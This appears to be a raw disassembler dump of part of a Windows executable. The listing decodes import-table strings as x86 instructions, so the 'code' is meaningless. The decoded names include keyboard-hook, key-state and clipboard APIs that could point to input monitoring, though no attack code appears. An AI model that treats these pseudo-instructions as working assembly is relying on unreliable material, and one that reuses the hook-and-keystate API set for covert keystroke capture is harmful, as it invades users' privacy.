  41e371:	outs   dx,BYTE PTR ds:[esi]
  41e372:	addr16 inc ecx
  41e374:	add    BYTE PTR [eax],al
  41e376:	ja     0x41e379
  41e378:	inc    edi
  41e379:	gs je  0x41e3d3
  41e37c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e383:	js     0x41e3f9
  41e385:	dec    esp
  41e386:	outs   dx,BYTE PTR gs:[esi]
  41e388:	addr16 je 0x41e3f3
  41e38b:	push   edi
  41e38c:	add    BYTE PTR [eax],al
  41e38e:	cmp    eax,0x65684300
  41e393:	arpl   WORD PTR [ebx+0x52],bp
  41e396:	popa   
  41e397:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  41e39f:	outs   dx,BYTE PTR ds:[esi]
  41e3a0:	add    BYTE PTR [eax],al
  41e3a2:	add    BYTE PTR [ecx],0x49
  41e3a5:	outs   dx,BYTE PTR ds:[esi]
  41e3a6:	data16 ins BYTE PTR es:[edi],dx
  41e3a8:	popa   
  41e3a9:	je     0x41e410
  41e3ab:	push   edx
  41e3ac:	arpl   WORD PTR gs:[eax+eax*1-0x70],si
  41e3b1:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41e3b5:	arpl   WORD PTR [ebx+0x50],bp
  41e3b8:	outs   dx,DWORD PTR ds:[esi]
  41e3b9:	jo     0x41e430
  41e3bb:	jo     0x41e40a
  41e3bd:	outs   dx,BYTE PTR gs:[esi]
  41e3bf:	jne    0x41e3c1
  41e3c1:	add    BYTE PTR ds:0x6c655202,dl
  41e3c7:	gs popa 
  41e3c9:	jae    0x41e430
  41e3cb:	inc    esp
  41e3cc:	inc    ebx
  41e3cd:	add    BYTE PTR [ebx],ch
  41e3cf:	add    dl,BYTE PTR [ebx+0x65]
  41e3d2:	outs   dx,BYTE PTR ds:[esi]
  41e3d3:	fs dec ebp
  41e3d5:	gs jae 0x41e44b
  41e3d8:	popa   
  41e3d9:	addr16 gs push edi
  41e3dc:	add    BYTE PTR [eax],al
  41e3de:	fild   DWORD PTR [ecx]
  41e3e0:	dec    ebp
  41e3e1:	outs   dx,DWORD PTR ds:[esi]
  41e3e2:	jbe    0x41e449
  41e3e4:	push   edi
  41e3e5:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e3ec:	mov    dl,0x0
  41e3ee:	inc    esp
  41e3ef:	jb     0x41e452
  41e3f1:	ja     0x41e439
  41e3f3:	jb     0x41e456
  41e3f5:	ins    DWORD PTR es:[edi],dx
  41e3f6:	gs inc ebx
  41e3f8:	outs   dx,DWORD PTR ds:[esi]
  41e3f9:	outs   dx,BYTE PTR ds:[esi]
  41e3fa:	je     0x41e46e
  41e3fc:	outs   dx,DWORD PTR ds:[esi]
  41e3fd:	ins    BYTE PTR es:[edi],dx
  41e3fe:	add    BYTE PTR [eax],al
  41e400:	stos   DWORD PTR es:[edi],eax
  41e401:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e405:	fs inc ebx
  41e407:	jne    0x41e47b
  41e409:	jae    0x41e47a
  41e40b:	jb     0x41e44e
  41e40d:	add    BYTE PTR [eax+0x2],ch
  41e410:	push   ebx
  41e411:	gs je  0x41e469
  41e414:	jae    0x41e47b
  41e416:	jb     0x41e467
  41e418:	bound  ebp,QWORD PTR [edx+0x65]
  41e41b:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  41e41f:	outs   dx,WORD PTR ds:[esi]
  41e421:	jb     0x41e490
  41e423:	popa   
  41e424:	je     0x41e48f
  41e426:	outs   dx,DWORD PTR ds:[esi]
  41e427:	outs   dx,BYTE PTR ds:[esi]
  41e428:	push   edi
  41e429:	add    BYTE PTR [ecx+0x0],ah
  41e42c:	inc    ebx
  41e42d:	jb     0x41e494
  41e42f:	popa   
  41e430:	je     0x41e497
  41e432:	push   eax
  41e433:	outs   dx,DWORD PTR ds:[esi]
  41e434:	jo     0x41e4ab
  41e436:	jo     0x41e485
  41e438:	outs   dx,BYTE PTR gs:[esi]
  41e43a:	jne    0x41e43c
  41e43c:	xor    al,0x2
  41e43e:	push   ebx
  41e43f:	gs je  0x41e485
  41e442:	ins    BYTE PTR es:[edi],dx
  41e443:	popa   
  41e444:	jae    0x41e4b9
  41e446:	dec    esp
  41e447:	outs   dx,DWORD PTR ds:[esi]
  41e448:	outs   dx,BYTE PTR ds:[esi]
  41e449:	addr16 push edi
  41e44b:	add    BYTE PTR [ebx+0x0],ah
  41e44e:	inc    ebx
  41e44f:	jb     0x41e4b6
  41e451:	popa   
  41e452:	je     0x41e4b9
  41e454:	push   edi
  41e455:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e45c:	push   edi
  41e45d:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  41e464:	outs   dx,DWORD PTR ds:[esi]
  41e465:	outs   dx,BYTE PTR ds:[esi]
  41e466:	imul   esp,DWORD PTR [ebx+0x0],0x49018500
  41e46d:	outs   dx,BYTE PTR ds:[esi]
  41e46e:	jae    0x41e4d5
  41e470:	jb     0x41e4e6
  41e472:	dec    ebp
  41e473:	outs   dx,BYTE PTR gs:[esi]
  41e475:	jne    0x41e4c0
  41e477:	je     0x41e4de
  41e479:	ins    DWORD PTR es:[edi],dx
  41e47a:	push   edi
  41e47b:	add    ah,ah
  41e47d:	add    DWORD PTR [edi+0x66],ecx
  41e480:	data16 jae 0x41e4e8
  41e483:	je     0x41e4d7
  41e485:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e48a:	scas   al,BYTE PTR es:[edi]
  41e48b:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e48f:	fs inc ebx
  41e491:	jne    0x41e505
  41e493:	jae    0x41e504
  41e495:	jb     0x41e4ee
  41e497:	add    BYTE PTR [ebx],al
  41e499:	add    BYTE PTR [ecx+0x64],al
  41e49c:	push   0x75
  41e49e:	jae    0x41e514
  41e4a0:	push   edi
  41e4a1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  41e4a8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  41e4ac:	add    BYTE PTR [eax],al
  41e4ae:	js     0x41e4b1
  41e4b0:	inc    edi
  41e4b1:	gs je  0x41e50b
  41e4b4:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e4bb:	js     0x41e531
  41e4bd:	push   edi
  41e4be:	add    BYTE PTR [eax],al
  41e4c0:	push   cs
  41e4c1:	add    DWORD PTR [edi+0x65],eax
  41e4c4:	je     0x41e50a
  41e4c6:	ins    BYTE PTR es:[edi],dx
  41e4c7:	addr16 inc ebx
  41e4c9:	je     0x41e53d
  41e4cb:	ins    BYTE PTR es:[edi],dx
  41e4cc:	dec    ecx
  41e4cd:	inc    esp
  41e4ce:	add    BYTE PTR [eax],al
  41e4d0:	mov    esp,0x6e695702
  41e4d5:	outs   dx,DWORD PTR fs:[esi]
  41e4d7:	ja     0x41e51f
  41e4d9:	jb     0x41e54a
  41e4db:	ins    DWORD PTR es:[edi],dx
  41e4dc:	push   eax
  41e4dd:	outs   dx,DWORD PTR ds:[esi]
  41e4de:	imul   ebp,DWORD PTR [esi+0x74],0x49018300
  41e4e5:	outs   dx,BYTE PTR ds:[esi]
  41e4e6:	jae    0x41e54d
  41e4e8:	jb     0x41e55e
  41e4ea:	dec    ebp
  41e4eb:	outs   dx,BYTE PTR gs:[esi]
  41e4ed:	jne    0x41e530
  41e4ef:	add    BYTE PTR [esi+0x73795302],al
  41e4f5:	je     0x41e55c
  41e4f7:	ins    DWORD PTR es:[edi],dx
  41e4f8:	push   eax
  41e4f9:	popa   
  41e4fa:	jb     0x41e55d
  41e4fc:	ins    DWORD PTR es:[edi],dx
  41e4fd:	gs je  0x41e565
  41e500:	jb     0x41e575
  41e502:	dec    ecx
  41e503:	outs   dx,BYTE PTR ds:[esi]
  41e504:	outs   dx,WORD PTR ds:[esi]
  41e506:	push   edi
  41e507:	add    BYTE PTR [edx],dh
  41e509:	add    DWORD PTR [edi+0x65],eax
  41e50c:	je     0x41e55b
  41e50e:	outs   dx,BYTE PTR gs:[esi]
  41e510:	jne    0x41e55b
  41e512:	je     0x41e579
  41e514:	ins    DWORD PTR es:[edi],dx
  41e515:	inc    ebx
  41e516:	outs   dx,DWORD PTR ds:[esi]
  41e517:	jne    0x41e587
  41e519:	je     0x41e51b
  41e51b:	add    BYTE PTR [ecx+0x4b6b5602],dh
  41e521:	gs jns 0x41e577
  41e524:	arpl   WORD PTR [ecx+0x6e],sp
  41e527:	push   edi
  41e528:	add    BYTE PTR [eax],al
  41e52a:	add    eax,DWORD PTR [edx]
  41e52c:	push   edx
  41e52d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e536:	popa   
  41e537:	jae    0x41e5ac
  41e539:	inc    ebp
  41e53a:	js     0x41e57d
  41e53c:	add    BYTE PTR [eax],al
  41e53e:	ret    
  41e53f:	add    BYTE PTR [ebp+0x6e],al
  41e542:	fs inc esp
  41e544:	imul   esp,DWORD PTR [ecx+0x6c],0x4600676f
  41e54b:	add    BYTE PTR [ebx+0x6c],al
  41e54e:	outs   dx,DWORD PTR ds:[esi]
  41e54f:	jae    0x41e5b6
  41e551:	inc    esp
  41e552:	gs jae 0x41e5c0
  41e555:	je     0x41e5c6
  41e557:	jo     0x41e559
  41e559:	add    BYTE PTR [eax+0x44734901],bl
  41e55f:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  41e566:	jae    0x41e5db
  41e568:	popa   
  41e569:	addr16 gs push edi
  41e56c:	add    BYTE PTR [eax],al
  41e56e:	out    0x1,eax
  41e570:	dec    edi
  41e571:	jo     0x41e5d8
  41e573:	outs   dx,BYTE PTR ds:[esi]
  41e574:	inc    esp
  41e575:	gs jae 0x41e5e3
  41e578:	je     0x41e5e9
  41e57a:	jo     0x41e5d3
  41e57c:	add    BYTE PTR [eax],al
  41e57e:	and    BYTE PTR [edx],al
  41e580:	push   ebx
  41e581:	arpl   WORD PTR [edx+0x6f],si
  41e584:	ins    BYTE PTR es:[edi],dx
  41e585:	ins    BYTE PTR es:[edi],dx
  41e586:	push   edi
  41e587:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e58e:	add    BYTE PTR [eax],al
  41e590:	mov    al,ds:0x57734901
  41e595:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e59c:	xor    eax,0x61684300
  41e5a1:	jb     0x41e5f7
  41e5a3:	outs   dx,DWORD PTR ds:[esi]
  41e5a4:	dec    edi
  41e5a5:	gs ins DWORD PTR es:[edi],dx
  41e5a7:	push   edi
  41e5a8:	add    BYTE PTR [eax],al
  41e5aa:	xor    al,BYTE PTR [edx]
  41e5ac:	push   ebx
  41e5ad:	gs je  0x41e5f3
  41e5b0:	popa   
  41e5b1:	jb     0x41e618
  41e5b3:	je     0x41e605
  41e5b5:	outs   dx,DWORD PTR ds:[esi]
  41e5b6:	jae    0x41e5b8
  41e5b8:	daa    
  41e5b9:	add    DWORD PTR [edi+0x65],eax
  41e5bc:	je     0x41e609
  41e5be:	gs jns 0x41e623
  41e5c1:	outs   dx,DWORD PTR ds:[esi]
  41e5c2:	popa   
  41e5c3:	jb     0x41e629
  41e5c5:	push   esp
  41e5c6:	jns    0x41e638
  41e5c8:	gs add bh,ch
  41e5cb:	add    DWORD PTR [eax+0x65],edx
  41e5ce:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  41e5d3:	jae    0x41e636
  41e5d5:	addr16 gs push edi
  41e5d8:	add    BYTE PTR [eax],al
  41e5da:	push   0x74654701
  41e5df:	push   edi
  41e5e0:	imul   ebp,DWORD PTR [esi+0x64],0x5900776f
  41e5e7:	add    BYTE PTR [ebx+0x72],al
  41e5ea:	gs popa 
  41e5ec:	je     0x41e653
  41e5ee:	inc    esp
  41e5ef:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  41e5f6:	jb     0x41e659
  41e5f8:	ins    DWORD PTR es:[edi],dx
  41e5f9:	push   edi
  41e5fa:	add    BYTE PTR [eax],al
  41e5fc:	je     0x41e600
  41e5fe:	push   ebx
  41e5ff:	gs je  0x41e659
  41e602:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e609:	js     0x41e67f
  41e60b:	push   edi
  41e60c:	add    BYTE PTR [eax],al
  41e60e:	xchg   ebx,eax
  41e60f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e613:	je     0x41e687
  41e615:	outs   dx,DWORD PTR ds:[esi]
  41e616:	jns    0x41e659
  41e618:	arpl   WORD PTR [ebx+0x65],sp
  41e61b:	ins    BYTE PTR es:[edi],dx
  41e61c:	gs jb  0x41e680
  41e61f:	je     0x41e690
  41e621:	jb     0x41e677
  41e623:	popa   
  41e624:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e628:	cmc    
  41e629:	add    BYTE PTR [edi+0x65],al
  41e62c:	je     0x41e671
  41e62e:	ins    BYTE PTR es:[edi],dx
  41e62f:	popa   
  41e630:	jae    0x41e6a5
  41e632:	dec    ecx
  41e633:	outs   dx,BYTE PTR ds:[esi]
  41e634:	outs   dx,WORD PTR ds:[esi]
  41e636:	inc    ebp
  41e637:	js     0x41e67a
  41e639:	add    BYTE PTR [ebp+0x1],ch
  41e63c:	inc    edi
  41e63d:	gs je  0x41e697
  41e640:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e647:	outs   dx,BYTE PTR ds:[esi]
  41e648:	addr16 push edi
  41e64a:	add    BYTE PTR [eax],al
  41e64c:	fld    QWORD PTR [eax]
  41e64e:	inc    ebp
  41e64f:	jno    0x41e6c6
  41e651:	popa   
  41e652:	ins    BYTE PTR es:[edi],dx
  41e653:	push   edx
  41e654:	arpl   WORD PTR gs:[eax+eax*1+0x5b],si
  41e659:	add    dl,BYTE PTR [ebx+0x65]
  41e65c:	je     0x41e6b1
  41e65e:	arpl   WORD PTR [edx+0x6f],si
  41e661:	ins    BYTE PTR es:[edi],dx
  41e662:	ins    BYTE PTR es:[edi],dx
  41e663:	push   eax
  41e664:	outs   dx,DWORD PTR ds:[esi]
  41e665:	jae    0x41e667
  41e667:	add    BYTE PTR [edx+0x57734901],ah
  41e66d:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  41e674:	imul   esp,DWORD PTR [ebx+0x6f],0xa6006564
  41e67b:	add    DWORD PTR [ebx+0x69],ecx
  41e67e:	ins    BYTE PTR es:[edi],dx
  41e67f:	ins    BYTE PTR es:[edi],dx
  41e680:	push   esp
  41e681:	imul   ebp,DWORD PTR [ebp+0x65],0x1810072
  41e688:	dec    ecx
  41e689:	outs   dx,BYTE PTR ds:[esi]
  41e68a:	push   ebx
  41e68b:	outs   dx,BYTE PTR gs:[esi]
  41e68d:	fs dec ebp
  41e68f:	gs jae 0x41e705
  41e692:	popa   
  41e693:	addr16 gs inc ebp
  41e696:	js     0x41e698
  41e698:	pop    ebx
  41e699:	add    BYTE PTR [ebx+0x72],al
  41e69c:	gs popa 
  41e69e:	je     0x41e705
  41e6a0:	dec    ecx
  41e6a1:	arpl   WORD PTR [edi+0x6e],bp
  41e6a4:	inc    esi
  41e6a5:	jb     0x41e716
  41e6a7:	ins    DWORD PTR es:[edi],dx
  41e6a8:	push   edx
  41e6a9:	gs jae 0x41e71b
  41e6ac:	jne    0x41e720
  41e6ae:	arpl   WORD PTR [ebp+0x0],sp
  41e6b1:	add    BYTE PTR [edx+0x0],cl
  41e6b4:	inc    ebx
  41e6b5:	outs   dx,DWORD PTR ds:[esi]
  41e6b6:	jo     0x41e731
  41e6b8:	inc    ecx
  41e6b9:	arpl   WORD PTR [ebx+0x65],sp
  41e6bc:	ins    BYTE PTR es:[edi],dx
  41e6bd:	gs jb  0x41e721
  41e6c0:	je     0x41e731
  41e6c2:	jb     0x41e718
  41e6c4:	popa   
  41e6c5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  41e6c9:	add    BYTE PTR [esi+0x66654400],cl
  41e6cf:	push   edi
  41e6d0:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41e6d7:	outs   dx,DWORD PTR ds:[esi]
  41e6d8:	arpl   WORD PTR [ecx+0x0],ax
  41e6db:	add    BYTE PTR [ebp+0x79656b02],bh
  41e6e1:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  41e6e5:	jbe    0x41e74c
  41e6e7:	outs   dx,BYTE PTR ds:[esi]
  41e6e8:	je     0x41e6ea
  41e6ea:	fadd   QWORD PTR [eax]
  41e6ec:	inc    ebp
  41e6ed:	outs   dx,BYTE PTR ds:[esi]
  41e6ee:	jne    0x41e75d
  41e6f0:	push   edi
  41e6f1:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e6f8:	adc    eax,DWORD PTR [ecx]
  41e6fa:	inc    edi
  41e6fb:	gs je  0x41e742
  41e6fe:	outs   dx,DWORD PTR ds:[esi]
  41e6ff:	jne    0x41e763
  41e701:	ins    BYTE PTR es:[edi],dx
  41e702:	gs inc ebx
  41e704:	ins    BYTE PTR es:[edi],dx
  41e705:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  41e70c:	add    BYTE PTR [eax],al
  41e70e:	cwde   
  41e70f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e713:	je     0x41e787
  41e715:	outs   dx,DWORD PTR ds:[esi]
  41e716:	jns    0x41e76f
  41e718:	imul   ebp,DWORD PTR [esi+0x64],0x2e00776f
  41e71f:	add    BYTE PTR [ebx+0x68],al
  41e722:	popa   
  41e723:	jb     0x41e775
  41e725:	jb     0x41e78c
  41e727:	jbe    0x41e76a
  41e729:	add    BYTE PTR [esi],ah
  41e72b:	add    dl,BYTE PTR [ebx+0x65]
  41e72e:	outs   dx,BYTE PTR ds:[esi]
  41e72f:	fs dec ebp
  41e731:	gs jae 0x41e7a7
  41e734:	popa   
  41e735:	addr16 gs inc ecx
  41e738:	add    BYTE PTR [eax],al
  41e73a:	mov    DWORD PTR [eax],eax
  41e73c:	inc    esp
  41e73d:	gs inc si
  41e740:	jb     0x41e7a3
  41e742:	ins    DWORD PTR es:[edi],dx
  41e743:	gs push eax
  41e745:	jb     0x41e7b6
  41e747:	arpl   WORD PTR [ecx+0x0],ax
  41e74a:	or     al,BYTE PTR [edx]
  41e74c:	push   edx
  41e74d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  41e756:	je     0x41e7a3
  41e758:	gs jns 0x41e75b
  41e75b:	add    BYTE PTR [eax],bh
  41e75d:	add    dl,BYTE PTR [ebx+0x65]
  41e760:	je     0x41e7a5
  41e762:	jne    0x41e7d6
  41e764:	jae    0x41e7d5
  41e766:	jb     0x41e768
  41e768:	push   0x1
  41e76a:	inc    edi
  41e76b:	gs je  0x41e7c5
  41e76e:	imul   ebp,DWORD PTR [esi+0x64],0x4344776f
  41e775:	add    BYTE PTR ds:0x74655302,bh
  41e77b:	inc    esp
  41e77c:	ins    BYTE PTR es:[edi],dx
  41e77d:	addr16 dec ecx
  41e77f:	je     0x41e7e6
  41e781:	ins    DWORD PTR es:[edi],dx
  41e782:	dec    ecx
  41e783:	outs   dx,BYTE PTR ds:[esi]
  41e784:	je     0x41e786
  41e786:	sbb    eax,0x73614300
  41e78b:	arpl   WORD PTR [ecx+0x64],sp
  41e78e:	gs push edi
  41e790:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e797:	add    BYTE PTR [ebx],dh
  41e799:	add    DWORD PTR [edi+0x65],eax
  41e79c:	je     0x41e7eb
  41e79e:	outs   dx,BYTE PTR gs:[esi]
  41e7a0:	jne    0x41e7eb
  41e7a2:	je     0x41e809
  41e7a4:	ins    DWORD PTR es:[edi],dx
  41e7a5:	dec    ecx
  41e7a6:	inc    esp
  41e7a7:	add    BYTE PTR [eax+eax*1+0x6c616944],bl
  41e7ae:	outs   dx,DWORD PTR ds:[esi]
  41e7af:	addr16 inc edx
  41e7b1:	outs   dx,DWORD PTR ds:[esi]
  41e7b2:	js     0x41e804
  41e7b4:	popa   
  41e7b5:	jb     0x41e818
  41e7b7:	ins    DWORD PTR es:[edi],dx
  41e7b8:	inc    ecx
  41e7b9:	add    BYTE PTR [edx+eax*1+0x74697753],al
  41e7c0:	arpl   WORD PTR [eax+0x54],bp
  41e7c3:	outs   dx,DWORD PTR ds:[esi]
  41e7c4:	push   esp
  41e7c5:	push   0x69577369
  41e7ca:	outs   dx,BYTE PTR ds:[esi]
  41e7cb:	outs   dx,DWORD PTR fs:[esi]
  41e7cd:	ja     0x41e7cf
  41e7cf:	add    BYTE PTR [eax+eax*1],bh
  41e7d2:	inc    ebx
  41e7d3:	push   0x4d6b6365
  41e7d8:	outs   dx,BYTE PTR gs:[esi]
  41e7da:	jne    0x41e82e
  41e7dc:	popa   
  41e7dd:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  41e7e5:	add    ah,al
  41e7e7:	add    DWORD PTR [ebp+0x61],ecx
  41e7ea:	jo     0x41e830
  41e7ec:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  41e7f3:	arpl   WORD PTR [eax+eax*1-0x5],si
  41e7f7:	add    DWORD PTR [eax+0x74],edx
  41e7fa:	dec    ecx
  41e7fb:	outs   dx,BYTE PTR ds:[esi]
  41e7fc:	push   edx
  41e7fd:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e802:	cdq    
  41e803:	add    DWORD PTR [ecx+0x73],ecx
  41e806:	inc    esp
  41e807:	ins    BYTE PTR es:[edi],dx
  41e808:	addr16 inc edx
  41e80a:	jne    0x41e880
  41e80c:	je     0x41e87d
  41e80e:	outs   dx,BYTE PTR ds:[esi]
  41e80f:	inc    ebx
  41e810:	push   0x656b6365
  41e815:	add    BYTE PTR fs:[eax],al
  41e818:	mov    edi,0x70737702
  41e81d:	jb     0x41e888
  41e81f:	outs   dx,BYTE PTR ds:[esi]
  41e820:	je     0x41e888
  41e822:	inc    ecx
  41e823:	add    BYTE PTR [ebx+0x1],bl
  41e826:	inc    edi
  41e827:	gs je  0x41e87d
  41e82a:	jns    0x41e89f
  41e82c:	je     0x41e893
  41e82e:	ins    DWORD PTR es:[edi],dx
  41e82f:	dec    ebp
  41e830:	outs   dx,BYTE PTR gs:[esi]
  41e832:	jne    0x41e834
  41e834:	add    al,0x2
  41e836:	push   edx
  41e837:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e840:	popa   
  41e841:	jae    0x41e8b6
  41e843:	inc    ebp
  41e844:	js     0x41e89d
  41e846:	add    BYTE PTR [eax],al
  41e848:	pusha  
  41e849:	add    BYTE PTR [ebx+0x72],al
  41e84c:	gs popa 
  41e84e:	je     0x41e8b5
  41e850:	dec    ebp
  41e851:	outs   dx,BYTE PTR gs:[esi]
  41e853:	jne    0x41e855
  41e855:	add    al,bh
  41e857:	add    BYTE PTR [edi+0x65],al
  41e85a:	je     0x41e89f
  41e85c:	ins    BYTE PTR es:[edi],dx
  41e85d:	popa   
  41e85e:	jae    0x41e8d3
  41e860:	dec    esp
  41e861:	outs   dx,DWORD PTR ds:[esi]
  41e862:	outs   dx,BYTE PTR ds:[esi]
  41e863:	addr16 inc ecx
  41e865:	add    BYTE PTR ds:0x74654701,dh
  41e86b:	dec    ebp
  41e86c:	outs   dx,BYTE PTR gs:[esi]
  41e86e:	jne    0x41e8b9
  41e870:	je     0x41e8d7
  41e872:	ins    DWORD PTR es:[edi],dx
  41e873:	dec    ecx
  41e874:	outs   dx,BYTE PTR ds:[esi]
  41e875:	outs   dx,WORD PTR ds:[esi]
  41e877:	push   edi
  41e878:	add    BYTE PTR [eax],al
  41e87a:	mov    ecx,0x616f4c01
  41e87f:	fs dec ebp
  41e881:	outs   dx,BYTE PTR gs:[esi]
  41e883:	jne    0x41e8dc
  41e885:	add    BYTE PTR [edx+0x1],ah
  41e888:	inc    edi
  41e889:	gs je  0x41e8e0
  41e88c:	outs   dx,DWORD PTR ds:[esi]
  41e88d:	jo     0x41e8e6
  41e88f:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e896:	dec    ebx
  41e897:	add    DWORD PTR [edi+0x65],eax
  41e89a:	je     0x41e8ec
  41e89c:	jb     0x41e90d
  41e89e:	jo     0x41e8f7
  41e8a0:	add    BYTE PTR [eax],al
  41e8a2:	cmp    al,BYTE PTR [edx]
  41e8a4:	push   ebx
  41e8a5:	gs je  0x41e8eb
  41e8a8:	jne    0x41e91c
  41e8aa:	jae    0x41e91b
  41e8ac:	jb     0x41e8fe
  41e8ae:	outs   dx,DWORD PTR ds:[esi]
  41e8af:	jae    0x41e8b1
  41e8b1:	add    bh,al
  41e8b3:	add    DWORD PTR [ebp+0x61],ecx
  41e8b6:	jo     0x41e90e
  41e8b8:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  41e8bf:	gs jns 0x41e907
  41e8c2:	js     0x41e91b
  41e8c4:	add    BYTE PTR [eax],al
  41e8c6:	jp     0x41e8ca
  41e8c8:	push   ebx
  41e8c9:	push   0x6143776f
  41e8ce:	jb     0x41e935
  41e8d0:	je     0x41e8d2
  41e8d2:	add    eax,0x67655202
  41e8d7:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41e8de:	popa   
  41e8df:	jae    0x41e954
  41e8e1:	push   edi
  41e8e2:	add    BYTE PTR [eax],al
  41e8e4:	scas   eax,DWORD PTR es:[edi]
  41e8e5:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e8e9:	fs dec ecx
  41e8eb:	arpl   WORD PTR [edi+0x6e],bp
  41e8ee:	inc    ecx
  41e8ef:	add    bl,dh
  41e8f1:	add    BYTE PTR [edi+0x65],al
  41e8f4:	je     0x41e939
  41e8f6:	popa   
  41e8f7:	jb     0x41e95e
  41e8f9:	je     0x41e94b
  41e8fb:	outs   dx,DWORD PTR ds:[esi]
  41e8fc:	jae    0x41e8fe
  41e8fe:	jnp    0x41e902
  41e900:	push   ebx
  41e901:	push   0x7543776f
  41e906:	jb     0x41e97b
  41e908:	outs   dx,DWORD PTR ds:[esi]
  41e909:	jb     0x41e90b
  41e90b:	add    BYTE PTR [eax+0x1],bl
  41e90e:	inc    edi
  41e90f:	gs je  0x41e965
  41e912:	jne    0x41e976
  41e914:	dec    ebp
  41e915:	outs   dx,BYTE PTR gs:[esi]
  41e917:	jne    0x41e919
  41e919:	add    cl,al
  41e91b:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  41e91f:	imul   esi,DWORD PTR [ebp+0x70],0x49
  41e923:	arpl   WORD PTR [edi+0x6e],bp
  41e926:	dec    ecx
  41e927:	fs inc esi
  41e929:	jb     0x41e99a
  41e92b:	ins    DWORD PTR es:[edi],dx
  41e92c:	inc    esp
  41e92d:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41e934:	jns    0x41e936
  41e936:	push   ebp
  41e937:	push   ebx
  41e938:	inc    ebp
  41e939:	push   edx
  41e93a:	xor    esi,DWORD PTR [edx]
  41e93c:	cs fs ins BYTE PTR es:[edi],dx
  41e93f:	ins    BYTE PTR es:[edi],dx
  41e940:	add    BYTE PTR [eax],al
  41e942:	push   ebx
  41e943:	dec    eax
  41e944:	inc    ebp
  41e945:	dec    esp
  41e946:	dec    esp
  41e947:	xor    esi,DWORD PTR [edx]
  41e949:	cs fs ins BYTE PTR es:[edi],dx
  41e94c:	ins    BYTE PTR es:[edi],dx
  41e94d:	add    BYTE PTR [ebx+0x70],dh
  41e950:	push   ecx
  41e951:	dec    edx
  41e952:	push   0x47
  41e954:	jne    0x41e99c
  41e956:	jns    0x41e99f
  41e958:	push   edi
  41e959:	push   esi
  41e95a:	inc    edi
  41e95b:	ins    BYTE PTR es:[edi],dx
  41e95c:	inc    ecx
  41e95d:	inc    edi
  41e95e:	push   ds
  41e95f:	in     eax,dx
  41e960:	inc    ecx
  41e961:	add    BYTE PTR [esi],ah
  41e963:	in     eax,dx
  41e964:	inc    ecx
  41e965:	add    BYTE PTR [esi-0x10ffbe15],ah
  41e96b:	or     esi,DWORD PTR [edx+0x324f7d0e]
  41e971:	dec    edi
  41e972:	addr16 dec edi
  41e974:	xor    DWORD PTR [edi+0x4f],ecx
  41e977:	dec    edi
  41e978:	cmp    al,0x4f
  41e97a:	jp     0x41e9cb
  41e97c:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e97f:	dec    edi
  41e980:	es dec edi
  41e982:	jae    0x41e9d3
  41e984:	and    eax,0x224f324f
  41e989:	dec    edi
  41e98a:	push   ds
  41e98b:	push   edx
  41e98c:	pop    ds
  41e98d:	push   ebx
  41e98e:	cmp    eax,0x324f7d4f
  41e993:	dec    edi
  41e994:	addr16 dec edi
  41e996:	xor    DWORD PTR [edi+0x4f],ecx
  41e999:	dec    edi
  41e99a:	cmp    al,0x4f
  41e99c:	jp     0x41e9ed
  41e99e:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e9a1:	dec    edi
  41e9a2:	es dec edi
  41e9a4:	ins    DWORD PTR es:[edi],dx
  41e9a5:	dec    edi
  41e9a6:	and    eax,0x224f324f
  41e9ab:	dec    edi
  41e9ac:	push   ds
  41e9ad:	bound  ebx,QWORD PTR [edi]
  41e9af:	arpl   WORD PTR ds:0x324f7d4f,di
  41e9b5:	dec    edi
  41e9b6:	bound  ecx,QWORD PTR [edi+0x31]
  41e9b9:	dec    edi
  41e9ba:	jae    0x41ea0b
  41e9bc:	cmp    eax,0x384f404f
  41e9c1:	dec    edi
  41e9c2:	xor    cl,BYTE PTR [edi+0x24]
  41e9c5:	dec    edi
  41e9c6:	push   ds
  41e9c7:	jb     0x41e9e8
  41e9c9:	jae    0x41e9da
  41e9cb:	or     DWORD PTR [eax+eax*4],0x7c
  41e9cf:	nop
  41e9d0:	jge    0x41e963
  41e9d2:	aas    
  41e9d3:	dec    edi
  41e9d4:	dec    di
